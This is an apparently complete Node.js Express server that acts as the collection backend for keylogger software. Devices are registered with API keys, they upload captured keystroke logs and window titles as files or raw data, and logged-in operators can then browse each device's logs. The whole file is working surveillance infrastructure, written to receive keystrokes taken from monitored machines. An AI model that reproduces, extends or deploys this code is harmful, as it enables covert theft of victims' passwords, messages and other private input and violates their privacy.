require('dotenv').config();
const express = require('express');
const cors = require('cors');
const mongoose = require('mongoose');
const jwt = require('jsonwebtoken');
const bcrypt = require('bcrypt');
const multer = require('multer');
const fs = require('fs');
const path = require('path');

// Models
const User = require('./models/User');
const KeyLog = require('./models/KeyLog');
const Device = require('./models/Device');

// Middleware
const auth = require('./middleware/auth');

// Initialize Express app
const app = express();
const PORT = process.env.PORT || 5000;

// Middleware
app.use(cors());
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// Connect to MongoDB
mongoose.connect(process.env.MONGODB_URI, {
  useNewUrlParser: true,
  useUnifiedTopology: true
})
.then(() => console.log('Connected to MongoDB'))
.catch(err => console.error('MongoDB connection error:', err));

// Set up file upload
const storage = multer.diskStorage({
  destination: function(req, file, cb) {
    const dir = path.join(__dirname, 'uploads');
    if (!fs.existsSync(dir)) {
      fs.mkdirSync(dir, { recursive: true });
    }
    cb(null, dir);
  },
  filename: function(req, file, cb) {
    cb(null, `${Date.now()}-${file.originalname}`);
  }
});

const upload = multer({ storage });

// API Routes

// Register a new user
app.post('/api/users/register', async (req, res) => {
  try {
    const { username, email, password } = req.body;
    
    // Check if user already exists
    const existingUser = await User.findOne({ email });
    if (existingUser) {
      return res.status(400).json({ message: 'User already exists' });
    }
    
    // Hash password
    const salt = await bcrypt.genSalt(10);
    const hashedPassword = await bcrypt.hash(password, salt);
    
    // Create new user
    const user = new User({
      username,
      email,
      password: hashedPassword
    });
    
    await user.save();
    
    // Generate JWT
    const token = jwt.sign({ id: user._id }, process.env.JWT_SECRET, {
      expiresIn: '1d'
    });
    
    res.status(201).json({
      id: user._id,
      username: user.username,
      email: user.email,
      token
    });
  } catch (error) {
    console.error('Register error:', error);
    res.status(500).json({ message: 'Server error' });
  }
});

// Login user
app.post('/api/users/login', async (req, res) => {
  try {
    const { email, password } = req.body;
    
    // Find user
    const user = await User.findOne({ email });
    if (!user) {
      return res.status(400).json({ message: 'Invalid credentials' });
    }
    
    // Check password
    const isMatch = await bcrypt.compare(password, user.password);
    if (!isMatch) {
      return res.status(400).json({ message: 'Invalid credentials' });
    }
    
    // Generate JWT
    const token = jwt.sign({ id: user._id }, process.env.JWT_SECRET, {
      expiresIn: '1d'
    });
    
    res.json({
      id: user._id,
      username: user.username,
      email: user.email,
      token
    });
  } catch (error) {
    console.error('Login error:', error);
    res.status(500).json({ message: 'Server error' });
  }
});

// Register a new device
app.post('/api/devices/register', auth, async (req, res) => {
  try {
    const { name, description } = req.body;
    
    // Create new device
    const device = new Device({
      name,
      description,
      user: req.user.id,
      apiKey: generateApiKey()
    });
    
    await device.save();
    
    res.status(201).json(device);
  } catch (error) {
    console.error('Device registration error:', error);
    res.status(500).json({ message: 'Server error' });
  }
});

// Get all devices for a user
app.get('/api/devices', auth, async (req, res) => {
  try {
    const devices = await Device.find({ user: req.user.id });
    res.json(devices);
  } catch (error) {
    console.error('Get devices error:', error);
    res.status(500).json({ message: 'Server error' });
  }
});

// Upload keylog file
app.post('/api/keylogs/upload', upload.single('logfile'), async (req, res) => {
  try {
    const { apiKey, deviceId } = req.body;
    
    // Verify device
    const device = await Device.findOne({ _id: deviceId, apiKey });
    if (!device) {
      return res.status(401).json({ message: 'Unauthorized' });
    }
    
    // Create keylog entry
    const keylog = new KeyLog({
      device: device._id,
      user: device.user,
      filename: req.file.filename,
      filepath: req.file.path,
      size: req.file.size
    });
    
    await keylog.save();
    
    res.status(201).json({ message: 'Log file uploaded successfully' });
  } catch (error) {
    console.error('Upload error:', error);
    res.status(500).json({ message: 'Server error' });
  }
});

// Direct log data submission (alternative to file upload)
app.post('/api/keylogs/data', async (req, res) => {
  try {
    const { apiKey, deviceId, logData, windowTitle, timestamp } = req.body;
    
    // Verify device
    const device = await Device.findOne({ _id: deviceId, apiKey });
    if (!device) {
      return res.status(401).json({ message: 'Unauthorized' });
    }
    
    // Create keylog entry
    const keylog = new KeyLog({
      device: device._id,
      user: device.user,
      logData,
      windowTitle,
      timestamp: timestamp || new Date()
    });
    
    await keylog.save();
    
    res.status(201).json({ message: 'Log data received successfully' });
  } catch (error) {
    console.error('Log data submission error:', error);
    res.status(500).json({ message: 'Server error' });
  }
});

// Get keylogs for a user
app.get('/api/keylogs', auth, async (req, res) => {
  try {
    const { deviceId, limit = 20, skip = 0 } = req.query;
    
    const query = { user: req.user.id };
    if (deviceId) {
      query.device = deviceId;
    }
    
    const keylogs = await KeyLog.find(query)
      .sort({ timestamp: -1 })
      .skip(Number(skip))
      .limit(Number(limit))
      .populate('device', 'name');
    
    const total = await KeyLog.countDocuments(query);
    
    res.json({
      keylogs,
      total
    });
  } catch (error) {
    console.error('Get keylogs error:', error);
    res.status(500).json({ message: 'Server error' });
  }
});

// Get keylog details
app.get('/api/keylogs/:id', auth, async (req, res) => {
  try {
    const keylog = await KeyLog.findOne({
      _id: req.params.id,
      user: req.user.id
    }).populate('device', 'name');
    
    if (!keylog) {
      return res.status(404).json({ message: 'Log not found' });
    }
    
    // If log is a file, read the file content
    if (keylog.filepath && fs.existsSync(keylog.filepath)) {
      const content = fs.readFileSync(keylog.filepath, 'utf8');
      keylog.logData = content;
    }
    
    res.json(keylog);
  } catch (error) {
    console.error('Get keylog details error:', error);
    res.status(500).json({ message: 'Server error' });
  }
});

// Helper function to generate API key
function generateApiKey() {
  return require('crypto').randomBytes(16).toString('hex');
}

// Start server
app.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
}); 